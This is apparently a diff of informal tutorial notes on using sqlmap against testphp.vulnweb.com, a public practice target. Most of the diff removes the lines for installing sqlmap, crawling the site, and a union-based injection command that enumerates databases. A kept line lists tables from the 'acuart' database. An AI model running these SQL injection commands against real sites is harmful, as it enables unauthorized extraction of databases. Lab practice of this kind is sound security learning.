@@ -13,27 +13,7 @@ testphp.vulnweb.com        [ open source test website]
 sudo apt-get update
 sudo apt-get upgrade
 or
-sudo apt update
-sudo apt upgrade
 
-sudo apt install sqlmap
-
-sqlmap --help              [ show all sqlmap cmd]
-
-sqlmap -u  http://testphp.vulnweb.com/ --crawl 2
--------------------------------------------------- 
-[https://www.contrive.mobi/aviorapi/HTTPMETHODS.html#:~:text=The%20primary%20or%20most%2Dcommonly,but%20are%20utilized%20less%20frequently.]
---------------------------------------------------
-GET parametter you recived like - 
-[http://testphp.vulnweb.com/artists.php?artist=1]
-open this in browser [check it is running or not]
- 
---------------------------------------------------
-use found url here
-sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --technique "U" --dbs  
-
-[in given link it will find/extract- database name, payload ]
-[now we have - parameter, database, payload]
 ---------------------------------------------------
 
 sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --technique "U" -D acuart -tables
